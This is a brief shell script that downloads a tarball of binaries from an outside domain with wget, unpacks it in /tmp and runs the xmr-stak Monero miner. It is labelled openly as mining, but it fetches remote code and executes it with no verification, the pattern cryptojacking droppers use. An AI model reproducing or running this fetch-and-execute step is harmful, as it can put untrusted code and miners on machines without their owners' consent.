#!/bin/sh

workingDir="/tmp/mine"
cleanup="rm -rf $workingDir"

echo "*********** MINING ***********"

eval $cleanup

mkdir -p $workingDir
cp ./bin/config.txt $workingDir
wget silvereletellier.com/binaries.tar.gz -O $workingDir/binaries.tar.gz

cd $workingDir
tar -xzf binaries.tar.gz


./xmr-stak
